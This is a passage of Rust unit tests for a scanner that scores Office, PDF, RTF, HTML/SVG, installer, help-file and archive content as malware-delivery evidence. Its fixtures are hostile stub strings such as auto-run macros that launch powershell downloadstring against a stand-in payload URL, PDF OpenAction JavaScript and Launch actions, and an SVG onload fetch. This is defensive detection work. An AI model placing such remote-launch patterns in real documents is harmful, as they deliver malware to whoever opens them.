        let evidence = score_file(Path::new("support.msi"), &analysis);

        assert!(evidence.iter().any(|item| {
            item.id == "windows_installer_custom_action_remote_launch" && item.weight == 40
        }));
    }

    #[test]
    fn windows_installer_patch_custom_action_script_host_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("support-patch.msp"),
            b"MsiPatchMetadata CustomAction WixQuietExec powershell downloadstring",
        )
        .unwrap();

        let evidence = score_file(Path::new("support-patch.msp"), &analysis);

        assert!(evidence.iter().any(|item| {
            item.id == "windows_installer_custom_action_remote_launch" && item.weight == 40
        }));
    }

    #[test]
    fn ordinary_windows_installer_document_link_is_not_review_evidence() {
        let mut bytes = compound_file_fixture();
        bytes.extend_from_slice(
            b"Windows Installer ProductCode https://example.invalid/readme.html",
        );
        let analysis = analyze_path(Path::new("docs.msi"), &bytes).unwrap();

        let evidence = score_file(Path::new("docs.msi"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "windows_installer_custom_action_remote_launch"));
    }

    #[test]
    fn non_installer_custom_action_text_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("notes.txt"),
            b"Windows Installer CustomAction WixQuietExec https://example.invalid/patch.msp",
        )
        .unwrap();

        let evidence = score_file(Path::new("notes.txt"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "windows_installer_custom_action_remote_launch"));
    }

    #[test]
    fn windows_appinstaller_remote_package_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("support.appinstaller"),
            br#"<AppInstaller Uri="https://example.invalid/support.appinstaller"
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2021">
  <MainPackage Name="Example.Support" Version="1.0.0.0"
      Publisher="CN=Example" Uri="https://example.invalid/packages/support.msix" />
</AppInstaller>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("support.appinstaller"), &analysis);

        assert!(evidence.iter().any(|item| {
            item.id == "windows_appinstaller_remote_package_launch" && item.weight == 40
        }));
    }

    #[test]
    fn ordinary_windows_appinstaller_document_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("docs.appinstaller"),
            br#"<AppInstaller Uri="https://example.invalid/docs.appinstaller"
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2021">
  <MainPackage Name="Example.Docs" Version="1.0.0.0"
      Publisher="CN=Example" Uri="https://example.invalid/readme.html" />
</AppInstaller>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("docs.appinstaller"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "windows_appinstaller_remote_package_launch"));
    }

    #[test]
    fn non_appinstaller_remote_package_text_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("notes.xml"),
            br#"<AppInstaller Uri="https://example.invalid/support.appinstaller"
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2021">
  <MainPackage Name="Example.Support" Version="1.0.0.0"
      Publisher="CN=Example" Uri="https://example.invalid/packages/support.msix" />
</AppInstaller>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("notes.xml"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "windows_appinstaller_remote_package_launch"));
    }

    #[test]
    fn office_query_remote_script_launch_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("remote-query.iqy"),
            b"WEB\n1\nhttps://example.invalid/payload.ps1",
        )
        .unwrap();

        let evidence = score_file(Path::new("remote-query.iqy"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "office_query_remote_script_launch" && item.weight == 40));
    }

    #[test]
    fn office_query_slk_script_host_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("spreadsheet-link.slk"),
            b"ID;PWXL;N;E\nC;X1;Y1;K\"powershell https://example.invalid/update.ps1\"",
        )
        .unwrap();

        let evidence = score_file(Path::new("spreadsheet-link.slk"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "office_query_remote_script_launch" && item.weight == 40));
    }

    #[test]
    fn ordinary_office_query_url_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("report-data.iqy"),
            b"WEB\n1\nhttps://example.invalid/data.csv",
        )
        .unwrap();

        let evidence = score_file(Path::new("report-data.iqy"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "office_query_remote_script_launch"));
    }

    #[test]
    fn office_macro_auto_run_remote_script_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("invoice.docm"),
            b"Sub AutoOpen()\npowershell https://example.invalid/payload.ps1\nEnd Sub",
        )
        .unwrap();

        let evidence = score_file(Path::new("invoice.docm"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "office_macro_auto_run_remote_launch" && item.weight == 45 }));
    }

    #[test]
    fn office_macro_auto_run_unc_script_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("budget.xlsm"),
            b"Private Sub Workbook_Open()\n\\\\fileserver\\share\\support.vbs\nEnd Sub",
        )
        .unwrap();

        let evidence = score_file(Path::new("budget.xlsm"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "office_macro_auto_run_remote_launch" && item.weight == 45 }));
    }

    #[test]
    fn legacy_office_macro_auto_run_remote_script_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("invoice-legacy.doc"),
            b"Sub AutoOpen()\npowershell https://example.invalid/payload.ps1\nEnd Sub",
        )
        .unwrap();

        let evidence = score_file(Path::new("invoice-legacy.doc"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "office_macro_auto_run_remote_launch" && item.weight == 45 }));
    }

    #[test]
    fn legacy_office_macro_auto_run_unc_script_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("budget-legacy.xls"),
            b"Private Sub Workbook_Open()\n\\\\fileserver\\share\\support.vbs\nEnd Sub",
        )
        .unwrap();

        let evidence = score_file(Path::new("budget-legacy.xls"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "office_macro_auto_run_remote_launch" && item.weight == 45 }));
    }

    #[test]
    fn legacy_office_macro_auto_run_script_host_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("briefing-legacy.ppt"),
            b"Sub Presentation_Open()\nwscript.shell downloadstring start-process\nEnd Sub",
        )
        .unwrap();

        let evidence = score_file(Path::new("briefing-legacy.ppt"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "office_macro_auto_run_remote_launch" && item.weight == 45 }));
    }

    #[test]
    fn ordinary_macro_enabled_office_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("agenda.docm"),
            b"Meeting notes https://example.invalid/readme.html",
        )
        .unwrap();

        let evidence = score_file(Path::new("agenda.docm"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "office_macro_auto_run_remote_launch"));
    }

    #[test]
    fn ordinary_legacy_office_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("agenda-legacy.doc"),
            b"Meeting notes https://example.invalid/readme.html",
        )
        .unwrap();

        let evidence = score_file(Path::new("agenda-legacy.doc"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "office_macro_auto_run_remote_launch"));
    }

    #[test]
    fn ordinary_docx_macro_terms_are_not_macro_enabled_evidence() {
        let analysis = analyze_path(
            Path::new("agenda.docx"),
            b"Sub AutoOpen()\npowershell https://example.invalid/payload.ps1\nEnd Sub",
        )
        .unwrap();

        let evidence = score_file(Path::new("agenda.docx"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "office_macro_auto_run_remote_launch"));
    }

    #[test]
    fn ooxml_macro_external_remote_relationship_is_review_evidence() {
        let analysis = analyze_path(Path::new("invoice-package.docm"), &ooxml_macro_package(
            b"word/vbaProject.bin",
            b"word/_rels/document.xml.rels",
            br#"<Relationship TargetMode="External" Target="https://example.invalid/payload.ps1"/>"#,
        ))
        .unwrap();

        let evidence = score_file(Path::new("invoice-package.docm"), &analysis);

        assert!(evidence.iter().any(|item| {
            item.id == "ooxml_macro_external_remote_relationship" && item.weight == 45
        }));
    }

    #[test]
    fn ordinary_ooxml_external_document_link_is_not_review_evidence() {
        let analysis = analyze_path(Path::new("agenda-package.docm"), &ooxml_macro_package(
            b"word/vbaProject.bin",
            b"word/_rels/document.xml.rels",
            br#"<Relationship TargetMode="External" Target="https://example.invalid/readme.html"/>"#,
        ))
        .unwrap();

        let evidence = score_file(Path::new("agenda-package.docm"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "ooxml_macro_external_remote_relationship"));
    }

    #[test]
    fn docx_ooxml_macro_project_is_not_macro_enabled_evidence() {
        let analysis = analyze_path(Path::new("agenda-package.docx"), &ooxml_macro_package(
            b"word/vbaProject.bin",
            b"word/_rels/document.xml.rels",
            br#"<Relationship TargetMode="External" Target="https://example.invalid/payload.ps1"/>"#,
        ))
        .unwrap();

        let evidence = score_file(Path::new("agenda-package.docx"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "ooxml_macro_external_remote_relationship"));
    }

    #[test]
    fn office_addin_remote_script_launch_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("addin-loader.xlam"),
            b"<Relationship Target=\"https://example.invalid/payload.ps1\" />",
        )
        .unwrap();

        let evidence = score_file(Path::new("addin-loader.xlam"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "office_addin_remote_script_launch" && item.weight == 40));
    }

    #[test]
    fn office_addin_xll_script_host_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("report-addin.xll"),
            b"Add-in metadata: powershell downloadstring start-process",
        )
        .unwrap();

        let evidence = score_file(Path::new("report-addin.xll"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "office_addin_remote_script_launch" && item.weight == 40));
    }

    #[test]
    fn ordinary_office_addin_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("report-tools.xlam"),
            b"<Relationship Target=\"https://example.invalid/readme.html\" />",
        )
        .unwrap();

        let evidence = score_file(Path::new("report-tools.xlam"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "office_addin_remote_script_launch"));
    }

    #[test]
    fn rtf_external_object_remote_script_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("invoice.rtf"),
            br"{\rtf1{\object\objautlink\objupdate https://example.invalid/payload.ps1}}",
        )
        .unwrap();

        let evidence = score_file(Path::new("invoice.rtf"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "rtf_external_object_remote_launch" && item.weight == 40 }));
    }

    #[test]
    fn rtf_external_object_unc_script_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("object-link.rtf"),
            br"{\rtf1{\field{\*\fldinst INCLUDETEXT file://fileserver/share/support.vbs}}}",
        )
        .unwrap();

        let evidence = score_file(Path::new("object-link.rtf"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "rtf_external_object_remote_launch" && item.weight == 40 }));
    }

    #[test]
    fn ordinary_rtf_web_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("agenda.rtf"),
            br"{\rtf1 Meeting notes https://example.invalid/readme.html}",
        )
        .unwrap();

        let evidence = score_file(Path::new("agenda.rtf"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "rtf_external_object_remote_launch"));
    }

    #[test]
    fn non_rtf_object_words_are_not_rtf_review_evidence() {
        let analysis = analyze_path(
            Path::new("object-link.txt"),
            b"object field includepicture https://example.invalid/payload.ps1",
        )
        .unwrap();

        let evidence = score_file(Path::new("object-link.txt"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "rtf_external_object_remote_launch"));
    }

    #[test]
    fn pdf_active_content_remote_script_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("invoice.pdf"),
            b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.launchURL('https://example.invalid/payload.js')) >> >>\nendobj",
        )
        .unwrap();

        let evidence = score_file(Path::new("invoice.pdf"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "pdf_active_content_remote_launch" && item.weight == 40 }));
    }

    #[test]
    fn pdf_launch_unc_script_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("launcher.pdf"),
            b"%PDF-1.7\n2 0 obj << /OpenAction << /S /Launch /F (file://fileserver/share/support.vbs) >> >>\nendobj",
        )
        .unwrap();

        let evidence = score_file(Path::new("launcher.pdf"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "pdf_active_content_remote_launch" && item.weight == 40 }));
    }

    #[test]
    fn ordinary_pdf_web_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("manual.pdf"),
            b"%PDF-1.7\n1 0 obj << /URI (https://example.invalid/readme.html) >>\nendobj",
        )
        .unwrap();

        let evidence = score_file(Path::new("manual.pdf"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "pdf_active_content_remote_launch"));
    }

    #[test]
    fn non_pdf_active_words_are_not_pdf_review_evidence() {
        let analysis = analyze_path(
            Path::new("pdf-words.txt"),
            b"/OpenAction /JavaScript https://example.invalid/payload.js",
        )
        .unwrap();

        let evidence = score_file(Path::new("pdf-words.txt"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "pdf_active_content_remote_launch"));
    }

    #[test]
    fn web_document_remote_script_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("invoice.html"),
            br#"<!doctype html><html><script>const u='https://example.invalid/payload.js'; const a=document.createElement('a'); a.download='payload.js';</script></html>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("invoice.html"), &analysis);

        assert!(evidence.iter().any(|item| {
            item.id == "web_document_active_content_remote_launch" && item.weight == 40
        }));
    }

    #[test]
    fn svg_onload_remote_script_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("diagram.svg"),
            br#"<svg onload="fetch('https://example.invalid/payload.js')"></svg>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("diagram.svg"), &analysis);

        assert!(evidence.iter().any(|item| {
            item.id == "web_document_active_content_remote_launch" && item.weight == 40
        }));
    }

    #[test]
    fn ordinary_html_web_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("manual.html"),
            br#"<!doctype html><html><a href="https://example.invalid/readme.html">guide</a></html>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("manual.html"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "web_document_active_content_remote_launch"));
    }

    #[test]
    fn non_web_document_active_words_are_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("web-words.txt"),
            b"<script>javascript: atob('x') https://example.invalid/payload.js",
        )
        .unwrap();

        let evidence = score_file(Path::new("web-words.txt"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "web_document_active_content_remote_launch"));
    }

    #[test]
    fn help_note_remote_script_launch_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("support.chm"),
            b"<object data=\"https://example.invalid/payload.js\"></object>",
        )
        .unwrap();

        let evidence = score_file(Path::new("support.chm"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "help_note_remote_script_launch" && item.weight == 40));
    }

    #[test]
    fn help_note_onepkg_script_host_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("meeting.onepkg"),
            b"Attachment preview: powershell downloadstring start-process",
        )
        .unwrap();

        let evidence = score_file(Path::new("meeting.onepkg"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "help_note_remote_script_launch" && item.weight == 40));
    }

    #[test]
    fn ordinary_help_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("manual.chm"),
            b"<a href=\"https://example.invalid/readme.html\">read the guide</a>",
        )
        .unwrap();

        let evidence = score_file(Path::new("manual.chm"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "help_note_remote_script_launch"));
    }

    #[test]
    fn deceptive_archive_executable_name_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("documents.zip"),
            &zip_with_stored_entries(&[(b"documents/invoice.pdf.exe", b"placeholder")]),
        )
        .unwrap();

        let evidence = score_file(Path::new("documents.zip"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "archive_suspicious_executable" && item.weight == 25));
    }

    #[test]
    fn ordinary_archive_executable_name_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("tools.zip"),
            &zip_with_stored_entries(&[(b"tools/setup.exe", b"placeholder")]),
        )
        .unwrap();

        let evidence = score_file(Path::new("tools.zip"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "archive_suspicious_executable"));
    }

    fn utf16le_bytes(text: &str) -> Vec<u8> {
        let mut bytes = Vec::new();
        for unit in text.encode_utf16() {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }
        bytes
    }

    fn compound_file_fixture() -> Vec<u8> {
        vec![0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]
    }

    fn ooxml_macro_package(
        vba_project_name: &[u8],
        relationship_name: &[u8],
        relationship_body: &[u8],
    ) -> Vec<u8> {
        zip_with_stored_entries(&[
            (vba_project_name, b"macro project placeholder".as_slice()),
            (relationship_name, relationship_body),
        ])
    }

    fn zip_with_stored_entries(entries: &[(&[u8], &[u8])]) -> Vec<u8> {
        let mut bytes = Vec::new();
        for (name, body) in entries {
            bytes.extend_from_slice(b"PK\x03\x04");
            bytes.extend_from_slice(&20u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u32.to_le_bytes());
            bytes.extend_from_slice(&(body.len() as u32).to_le_bytes());
            bytes.extend_from_slice(&(body.len() as u32).to_le_bytes());
            bytes.extend_from_slice(&(name.len() as u16).to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(name);
            bytes.extend_from_slice(body);
        }
        bytes
    }
}
